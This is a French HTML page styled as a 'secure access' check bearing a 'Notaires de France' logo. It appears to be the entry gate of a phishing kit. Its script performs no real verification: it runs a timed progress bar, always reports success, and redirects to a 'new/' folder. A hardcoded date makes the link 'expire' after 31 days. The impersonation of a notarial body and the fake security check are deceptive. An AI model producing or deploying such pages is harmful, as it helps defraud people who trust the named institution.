<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Accès sécurisé</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f6f9;
      color: #333;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .captcha-container {
      max-width: 400px;
      margin: auto;
      background: #ffffff;
      border-radius: 10px;
      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .logo {
      max-width: 120px;
      margin-bottom: 20px;
    }

    h2 {
      color: #004080;
      font-size: 22px;
      margin-bottom: 20px;
    }

    .loading-container {
      margin: 25px 0;
      padding: 20px;
    }

    .loading-text {
      margin-bottom: 20px;
      font-size: 16px;
      color: #555;
    }

    .loading-bar {
      height: 6px;
      background-color: #e0e0e0;
      border-radius: 3px;
      overflow: hidden;
      margin-bottom: 10px;
    }

    .loading-progress {
      height: 100%;
      width: 0%;
      background-color: #004080;
      border-radius: 3px;
      transition: width 0.5s ease;
    }

    .countdown {
      font-size: 14px;
      color: #777;
    }

    .error-message,
    .success-message {
      margin-top: 15px;
      font-weight: bold;
      display: none;
    }

    .error-message {
      color: #e74c3c;
    }

    .success-message {
      color: #27ae60;
    }

    .expired-message {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #1a1a1a;
      color: #ff4d4f;
      font-family: 'Segoe UI', sans-serif;
      font-size: 20px;
      text-align: center;
      padding: 40px;
    }

    .expired-message h1 {
      font-size: 32px;
      margin-bottom: 20px;
    }

    @media (max-width: 480px) {
      .captcha-container {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <img src="new/files/img/logo.svg" alt="Logo Notaires de France" class="logo">
    <h2>Accès sécurisé</h2>
    
    <div class="loading-container">
      <div class="loading-text">Vérification en cours, veuillez patienter...</div>
      <div class="loading-bar">
        <div class="loading-progress" id="loading-progress"></div>
      </div>
      <div class="countdown" id="countdown">Redirection dans 5 secondes</div>
    </div>

    <div class="error-message" id="error-message">❌ Erreur de vérification. Veuillez réessayer.</div>
    <div class="success-message" id="success-message">✅ Vérification réussie. Redirection en cours...</div>
  </div>

  <script>
    // Vérification expiration lien
    const startDate = new Date('2025-12-16T00:00:00');
    const expirationDays = 31;

    function isLinkExpired() {
      const now = new Date();
      const diff = now - startDate;
      const daysPassed = diff / (1000 * 60 * 60 * 24);
      return daysPassed >= expirationDays;
    }

    function showExpirationMessage() {
      if (isLinkExpired()) {
        document.body.innerHTML = '';
        const msg = document.createElement('div');
        msg.className = 'expired-message';
        msg.innerHTML = `
          <h1>⚠️ Lien expiré</h1>
          <p>Ce lien n'est plus valide. Veuillez contacter l'administrateur.</p>
        `;
        document.body.appendChild(msg);
        return true;
      }
      return false;
    }

    function startLoadingProcess() {
      const progressBar = document.getElementById('loading-progress');
      const countdownElement = document.getElementById('countdown');
      const successMessage = document.getElementById('success-message');
      
      let timeLeft = 5; // Temps en secondes
      const interval = 100; // Mise à jour toutes les 100ms
      const totalSteps = 5000 / interval; // 5000ms / 100ms = 50 étapes
      let currentStep = 0;
      
      const timer = setInterval(() => {
        currentStep++;
        const progress = (currentStep / totalSteps) * 100;
        progressBar.style.width = `${progress}%`;
        
        // Mise à jour du compte à rebours toutes les secondes
        if (currentStep % 10 === 0) {
          timeLeft--;
          countdownElement.textContent = `Redirection dans ${timeLeft} seconde${timeLeft > 1 ? 's' : ''}`;
        }
        
        // Quand le chargement est terminé
        if (currentStep >= totalSteps) {
          clearInterval(timer);
          successMessage.style.display = 'block';
          
          // Redirection après un court délai pour montrer le message de succès
          setTimeout(() => {
            localStorage.setItem("valide", "true");
            window.location.href = 'new/';
          }, 500);
        }
      }, interval);
    }

    window.onload = function () {
      // Vérifier si le lien a expiré
      if (!showExpirationMessage()) {
        // Démarrer le processus de chargement si le lien est valide
        startLoadingProcess();
      }
    };
  </script>
</body>
</html>
